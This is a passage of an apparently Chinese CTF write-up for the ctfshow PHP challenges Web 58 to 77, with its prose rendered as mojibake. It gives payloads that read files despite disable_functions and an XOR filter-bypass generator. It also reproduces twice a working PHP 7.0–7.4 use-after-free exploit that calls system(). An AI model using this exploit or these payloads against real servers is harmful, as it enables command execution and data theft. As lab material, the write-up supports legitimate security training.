range(1, 256): for j in range(1, 256): if not (re.search(preg, chr(i), re.I) or re.search(preg, chr(j), re.I)): k = i ^ j if k &gt;= 32 and k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) str = (str + chr(k) + &quot; &quot; + a + &quot; &quot; + b + &quot;\\n&quot;) fp = open(&#x27;result.txt&#x27;, &#x27;w&#x27;) fp.write(str)def produce(string): str1 = &quot;&quot; str2 = &quot;&quot; for i in string: fp = open(&#x27;result.txt&#x27;, &#x27;r&#x27;) while True: line = fp.readline() if line == &quot;&quot;: break if line[0] == i: str1 = str1 + line[2:5] str2 = str2 + line[6:9] break fp.close() result = &quot;(\\&quot;&quot; + str1 + &quot;\\&quot;^\\&quot;&quot; + str2 + &quot;\\&quot;)&quot; return resultif __name__ == &quot;__main__&quot;: write() while True: function = input(&quot;è¾“å‡ºæ‰§è¡Œå‡½æ•°:&quot;) parms = input(&quot;è¯·è¾“å‡ºå‡½æ•°å‚æ•°:&quot;) payload = produce(function) + produce(parms) print(payload) 1.30 Web 58 â€” disable_functions open_basedirï¼šå°†PHPæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚fopen()æˆ–file_get_contents()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€ disable_functionsï¼šç”¨äºç¦æ­¢æŸäº›å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯é»‘åå•ï¼Œç®€å•æ¥è¯´å°±æ˜¯phpä¸ºäº†é˜²æ­¢æŸäº›å±é™©å‡½æ•°æ‰§è¡Œç»™å‡ºçš„é…ç½®é¡¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºç©º å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•° 1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1# ä½¿ç”¨æœ€å¸¸è§çš„ c=system(&#x27;ls&#x27;);# å¾—åˆ°Warning: system() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1# å‡½æ•°è¢«ç¦ç”¨ 1# é¦–å…ˆå°è¯•ä¸ä½¿ç”¨ å‘½ä»¤æ‰§è¡Œçš„å‡½æ•° # å¥—å¨ƒ å‡½æ•°å¥—ç”¨c=print_r(scandir(current(localeconv())));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )c=highlight_file(next(array_reverse(scandir(current(localeconv())))));c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;); 1# ç»•disable_functions# åˆ©ç”¨ è¯»æ–‡ä»¶ çš„å‡½æ•°file_get_contents()highlight_file()show_source()fgets()file()var_dump()readfile()# åˆ©ç”¨c=echo file_get_contents(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);c=readfile(&#x27;flag.php&#x27;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while($b=fgets($a))&#123;echo $b;&#125;c=$handle=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$handle=fopen(&#x27;flag.php&#x27;,&#x27;r&#x27;);echo fread($handle,1000); 1# å¤åˆ¶ é‡å‘½åcopy(&quot;flag.php&quot;,&quot;flag.txt&quot;); rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# å³c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# åè®¿é—® URL/flag.txt å³å¯ 1.31 Web 59 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; ç¦ç”¨äº†ä¸€äº›å‡½æ•°ï¼Œä¸è¿‡ä»å¯ç»•è¿‡ 1c=show_source(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;); 1.32 Web 60 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.33 Web 61 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.34 Web 62 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.35 Web 63 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.36 Web 64 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.37 Web 65 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=show_source(&#x27;flag.php&#x27;); 1.38 Web 66 â€” disable_functions1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; å°è¯•ä¹‹å‰çš„è¯»å–æ–‡ä»¶çš„å‡½æ•°ä»¥åŠå†™å…¥æ–‡ä»¶ã€é‡å‘½åç­‰ç­‰éƒ½è¢«ç¦ç”¨ ä½†æ˜¯ highlight_file() èƒ½å¤Ÿä½¿ç”¨ æ˜¾ç„¶æ¢äº†ä½ç½® 1c=print_r(scandir(&#x27;/&#x27;)); #æŸ¥æ–‡ä»¶# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )c=highlight_file(&#x27;/flag.txt&#x27;); 1.39 Web 67 â€” disable_functions â€” var_dump(scandir(â€˜/â€˜));1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 1c=highlight_file(&#x27;flag.php&#x27;);# print_r() è¢«è¿‡æ»¤ var_dump() ä»£æ›¿c=var_dump(scandir(&#x27;/&#x27;));c=highlight_file(&#x27;/flag.txt&#x27;); 1.40 Web 68 â€” disable_functions â€” include(â€œ/flag.txtâ€);ç›´æ¥æ˜¾ç¤º highlight_file() è¢«ç¦ç”¨ æ–‡ä»¶åŒ…å« include 1c=var_dump(scandir(&#x27;/&#x27;));# highlight_file() è¢«ç¦ç”¨ åˆ©ç”¨æ–‡ä»¶åŒ…å«c=include(&quot;/flag.txt&quot;);# includeå‡½æ•°ä¼šè·å–æŒ‡å®šæ–‡ä»¶ä¸­å­˜åœ¨çš„æ‰€æœ‰æ–‡æœ¬/ä»£ç /æ ‡è®°ï¼Œå¹¶å¤åˆ¶åˆ°ä½¿ç”¨ include è¯­å¥çš„æ–‡ä»¶ä¸­ã€‚æ–‡ä»¶å†…å®¹æœ‰ä»£ç åˆ™æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥è¾“å‡ºã€‚ 1.41 Web 69 â€” disable_functions â€” var_export(scandir(â€˜/â€˜));1c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.42 Web 701c=var_export(scandir(&#x27;/&#x27;));c=include(&quot;/flag.txt&quot;); 1.43 Web 71 â€” disable_functions â€” exit();1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;ä½ è¦ä¸Šå¤©å—ï¼Ÿ å°†æ‰€æœ‰çš„ å­—æ¯ã€æ•°å­—æ¢æˆäº† ? å¼ºåˆ¶é€€å‡º 1c=highlight_file(&#x27;flag.php&#x27;);exit(); #ç¦ç”¨c=var_export(scandir(&#x27;/&#x27;));exit();c=include(&#x27;/flag.txt&#x27;);die(); åˆ—ç›®å½•æ–°å§¿åŠ¿1print_r(glob(&quot;*&quot;)); // åˆ—å½“å‰ç›®å½•print_r(glob(&quot;/*&quot;)); // åˆ—æ ¹ç›®å½•print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125;$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125; 1c=$a=scandir(&quot;/&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot; &quot;;&#125; 1c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit(); 1$dir = new DirectoryIterator(dirname(__FILE__));foreach ($dir as $file)&#123; if($file-&gt;isFile())&#123; echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;; &#125;&#125;exit(0);c=$dir = new DirectoryIterator(dirname(__FILE__));foreach($dir as $file)&#123;print($file-&gt;getFilename());&#125;;exit(0);c=$dir = new DirectoryIterator(&quot;glob:///*&quot;);foreach($dir as $file)&#123;echo $file-&gt;getFilename().&quot;&lt;br&gt;&quot;;&#125;;exit(0); ob_get_contentså‡½æ•°è·å¾—ç¼“å†²åŒºçš„å†…å®¹ï¼Œå³åœ¨æ­¤ä¸ºä»£ç æ‰§è¡Œçš„è¾“å‡ºç»“æœ åœ¨ä»»ä½•æ—¶å€™ä½¿ç”¨echoï¼Œè¾“å‡ºéƒ½å°†è¢«åŠ å…¥ç¼“å†²åŒºä¸­ï¼Œç›´åˆ°ç¨‹åºè¿è¡Œç»“æŸæˆ–è€…ä½¿ç”¨ob_flush()æ¥ç»“æŸã€‚ç„¶ååœ¨æœåŠ¡å™¨ä¸­ç¼“å†²åŒºçš„å†…å®¹æ‰ä¼šå‘é€åˆ°æµè§ˆå™¨ï¼Œç”±æµè§ˆå™¨æ¥è§£ææ˜¾ç¤ºã€‚ ob_end_cleanå‡½æ•°æ¸…é™¤ç¼“å†²åŒºçš„å†…å®¹ã€‚ æ­¤æ—¶å¾—ç”¨ä¸€ä¸ªå‡½æ•°ob_get_contents()åœ¨ob_end_clean()å‰é¢æ¥è·å¾—ç¼“å†²åŒºçš„å†…å®¹ã€‚è¿™æ ·çš„è¯ï¼Œèƒ½å°†åœ¨æ‰§è¡Œob_end_clean()å‰æŠŠå†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªå˜é‡ä¸­ï¼Œç„¶ååœ¨ob_end_clean()å‡½æ•°æ‰§è¡Œåå¯¹è¿™ä¸ªå˜é‡åšæ“ä½œã€‚ exit() å‡½æ•°è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ã€‚ é‚£ä¹ˆåœ¨æ‰§è¡Œå®Œä»£ç ä¹‹åç»“æŸè„šæœ¬çš„è¿è¡Œå°±å¯ä»¥äº† 1.44 Web 72 â€” disable_functions â€” php7-backtrace-bypass è„šæœ¬1&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;ä½ è¦ä¸Šå¤©å—ï¼Ÿ php7-backtrace-bypass è„šæœ¬ 1c=function ctfshow($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd); exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush(); 1&lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(&quot;uname -a&quot;);function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4 $backtrace = debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 0; $j--) &#123; $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m = 8) &#123; $out = &quot;&quot;; for ($i=0; $i &lt; $m; $i++) &#123; $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n = 8) &#123; $i = 0; for($i = 0; $i &lt; $n; $i++) &#123; $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; &#125; &#125; function leak($addr, $p = 0, $s = 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) &#123; $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec $text_size = $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) &#123; $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;constant&#x27; constant check if($deref != 0x746e6174736e6f63) continue; &#125; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref = leak($leak); # &#x27;bin2hex&#x27; constant check if($deref != 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) &#123; $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr = $basic_funcs; do &#123; $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr += 0x20; &#125; while($f_entry != 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; &#125; if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123; die(&#x27;This PoC is for *nix systems only.&#x27;); &#125; $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(&#x27;A&#x27;, 79)); trigger_uaf(&#x27;x&#x27;); $abc = $backtrace[1][&#x27;args&#x27;][0]; $helper = new Helper; $helper-&gt;b = function ($x) &#123; &#125;; if(strlen($abc) == 79 || strlen($abc) == 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#x27;t determine binary base address&quot;); &#125; if(!($elf = parse_elf($base))) &#123; die(&quot;Couldn&#x27;t parse ELF header&quot;); &#125; if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#x27;t get basic_functions address&quot;); &#125; if(!($zif_system = get_system($basic_funcs))) &#123; die(&quot;Couldn&#x27;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();&#125; https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php 1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit(); 1 1.45 Web 73 â€” disable_functions â€” DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=include(&#x27;/flagc.txt&#x27;);exit(); 1.46 Web 74 â€” disable_functions â€” DirectoryIterator1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr varc=include(&#x27;/flagx.txt&#x27;);exit(); 1.47 Web 75 â€” disable_functions â€” æ•°æ®åº“ã€SQL è¯­å¥1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var SQL è¯­å¥ç»•è¿‡ 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# å³c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.48 Web 76 â€” disable_functions â€” æ•°æ®åº“ã€SQL è¯­å¥1c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f.&quot; &quot; ;&#125;exit();# bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 1c=try &#123; $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;); foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row) &#123; echo ($row[0]) . &quot;|&quot;; &#125; $dbh = null;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage(); exit(0);&#125;exit(0);# å³c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e&gt;getMessage();exit(0);&#125;exit(0); 1.50 Web 77 â€” disable_functions â€” FFI æ‰©å±•å‘½ä»¤FFI æ‰©å±•å‘½ä»¤ å‚è€ƒ 1# ç‰ˆæœ¬ php7.4 æ‰©å±•ç®€ä»‹FFI æ˜¯åœ¨ PHP 7.4 ç‰ˆæœ¬ä¸­æ–°åŠ å…¥çš„ï¼Œæ­¤æ‰©å±•å…è®¸åœ¨ PHP ä»£ç ä¸­åŠ è½½å…±äº«åº“(.DLL æˆ– .so)ï¼Œè°ƒç”¨ C å‡½æ•°åŠè®¿é—® C æ•°æ®ç»“æ„ï¼Œç®€å•çš„è¯´å°±æ˜¯å…è®¸åœ¨ PHP ä¸­è¿è¡Œ C ä»£ç ï¼Œå¯ä»¥æ–¹ä¾¿çš„è°ƒç”¨Cè¯­è¨€çš„å„ç§åº“ï¼Œä½†åŒæ—¶å®ƒçš„ä½¿ç”¨ä¼´éšç€å¾ˆå¤§çš„é£é™© ä½¿ç”¨é…ç½®ä½¿ç”¨ FFI é¦–å…ˆè¦å¼€å¯æ‰©å±•ï¼Œåœ¨ php.ini ä¸­å»æ‰ extension=ffi å‰é¢çš„ ; å¹¶ä¸”ä¿®æ”¹ ffi.enable=true å³å¯ä½¿ç”¨ï¼Œåœ¨phpinfo() ä¸­å¯ä»¥æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†æ­¤æ‰©å±• 1# 